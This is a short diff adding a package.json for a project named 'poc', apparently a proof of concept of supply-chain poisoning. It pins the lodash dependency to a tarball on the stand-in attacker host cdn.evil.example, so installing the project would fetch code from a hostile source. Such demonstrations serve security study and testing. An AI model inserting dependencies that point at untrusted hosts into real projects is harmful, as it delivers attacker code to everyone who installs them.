@@ -1,0 +1,7 @@
+{
+ "name": "poc",
+ "version": "1.0.0",
+ "dependencies": {
+  "lodash": "https://cdn.evil.example/lodash-4.17.21.tgz"
+ }
+}
